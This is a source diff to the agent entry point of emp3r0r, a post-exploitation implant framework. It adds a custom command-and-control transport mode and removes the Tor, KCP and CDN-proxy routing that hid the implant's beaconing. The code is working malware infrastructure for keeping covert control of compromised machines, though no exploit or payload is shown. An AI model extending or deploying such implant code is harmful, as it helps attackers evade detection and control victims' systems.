@@ -17,7 +17,6 @@ import (
 	"github.com/jm33-m0/emp3r0r/core/internal/def"
 	"github.com/jm33-m0/emp3r0r/core/internal/transport"
 	"github.com/jm33-m0/emp3r0r/core/lib/logging"
-	"github.com/jm33-m0/emp3r0r/core/lib/netutil"
 	"github.com/jm33-m0/emp3r0r/core/lib/syscall"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
 )
@@ -108,6 +107,10 @@ func agent_main() {
 		logging.Fatalf("ApplyRuntimeConfig: %v", err)
 	}
 	util.SetFileCryptoKey([]byte(common.RuntimeConfig.Password))
+	customTransport := !def.IsBuiltinC2ChannelMode(common.RuntimeConfig.C2ChannelMode)
+	if customTransport {
+		logging.Infof("Using custom C2 transport %q; HTTP-specific setup is disabled", common.RuntimeConfig.C2ChannelMode)
+	}
 
 	// Spread out check-ins so a fleet of agents does not beacon in lockstep.
 	if delay := initialCheckinDelay(common.RuntimeConfig); delay > 0 {
@@ -119,18 +122,6 @@ func agent_main() {
 	agentutils.InitializePath()
 	ensureHomeDir()
 
-	// Tor hides the CC behind a local SOCKS proxy; otherwise KCP can carry the
-	// C2 traffic directly.
-	if netutil.IsTor(def.CCAddress) {
-		logging.Infof("CC is on TOR (%s), using %s as TOR proxy", def.CCAddress, common.RuntimeConfig.C2TransportProxy)
-	} else if common.RuntimeConfig.UseKCP {
-		// run KCP
-		go func() {
-			if err := c2transport.RunKCPClient(); err != nil {
-				logging.Errorf("KCP transport unavailable: %v", err)
-			}
-		}()
-	}
 	logging.Infof("CCAddress is: %s", def.CCAddress)
 
 	// DNS
@@ -139,28 +130,6 @@ func agent_main() {
 		if err := applyDoHResolver(common.RuntimeConfig.DoHServer); err != nil {
 			logging.Fatalf("cannot start DoH resolver: %v", err)
 		}
-	}
-
-	// if user wants to use CDN proxy
-	upperProxy := common.RuntimeConfig.C2TransportProxy // when using CDNproxy: agent => CDN proxy => upper_proxy => C2
-	if common.RuntimeConfig.CDNProxy != "" {
-		logging.Infof("C2 is behind CDN, using CDNProxy %s", common.RuntimeConfig.CDNProxy)
-		cdnproxyAddr := fmt.Sprintf("socks5://127.0.0.1:%d", util.RandInt(1024, 65535))
-		dohURL := "https://9.9.9.9/dns-query"
-		if common.RuntimeConfig.DoHServer != "" {
-			dohURL = common.RuntimeConfig.DoHServer
-		}
-		go func() {
-			for !transport.IsProxyOK(cdnproxyAddr, def.CCAddress) {
-				// typically you need to configure AgentProxy manually if agent doesn't have internet
-				// and AgentProxy will be used for websocket connection, then replaced with 10888
-				err := runCDNProxy(strings.Split(cdnproxyAddr, "socks5://")[1], common.RuntimeConfig.CDNProxy, upperProxy, dohURL)
-				if err != nil {
-					logging.Infof("CDN proxy at %s stopped (%v), restarting", cdnproxyAddr, err)
-				}
-			}
-		}()
-		common.RuntimeConfig.C2TransportProxy = cdnproxyAddr
 	}
 
 	// Initialize the syscall table (idempotent; Windows-only work, no-op elsewhere).
@@ -172,6 +141,9 @@ func agent_main() {
 	// Mode selection: P2P mesh vs standalone
 	// ────────────────────────────────────────────────────────────────────────────
 	if common.RuntimeConfig.IsP2PEnabled {
+		if customTransport {
+			logging.Fatalf("P2P mesh is not supported with custom C2 transport %q", common.RuntimeConfig.C2ChannelMode)
+		}
 		meshCtx, meshCancel := context.WithCancel(context.Background())
 		defer meshCancel()
 		mesh.Start(meshCtx)
@@ -237,7 +209,7 @@ connect:
 	// Preflight check: Silent Nodes have no direct C2 path, so they must not
 	// touch the C2 status URL and skip this entirely.
 	isSilentNode := common.RuntimeConfig.IsP2PEnabled && !common.RuntimeConfig.IsDirectC2Enabled
-	if !isSilentNode {
+	if !customTransport && !isSilentNode {
 		if !c2transport.CheckC2Condition(common.RuntimeConfig.C2TransportProxy) {
 			logging.Infof("Preflight check failed, signaling parent and sleeping")
 			conditionalC2FailNotify()
@@ -246,7 +218,10 @@ connect:
 	}
 
 	// Build C2 HTTP client. Silent Nodes already created theirs above with relay dialer.
-	if !isSilentNode {
+	// Custom transports do not use an HTTP client at all.
+	if customTransport {
+		def.HTTPClient = nil
+	} else if !isSilentNode {
 		def.HTTPClient = transport.CreateEmp3r0rHTTPClient(def.CCAddress, common.RuntimeConfig.C2TransportProxy)
 		if def.HTTPClient == nil {
 			logging.Infof("[-] Failed to create HTTP2 client, signaling parent and retrying")
@@ -266,10 +241,12 @@ connect:
 			goto connect
 		}
 	}
-	if common.RuntimeConfig.C2TransportProxy != "" {
-		logging.Infof("Using proxy: %s", common.RuntimeConfig.C2TransportProxy)
-	} else {
-		logging.Infof("Not using proxy")
+	if !customTransport {
+		if common.RuntimeConfig.C2TransportProxy != "" {
+			logging.Infof("Using proxy: %s", common.RuntimeConfig.C2TransportProxy)
+		} else {
+			logging.Infof("Not using proxy")
+		}
 	}
 
 	if !isCheckedIn {
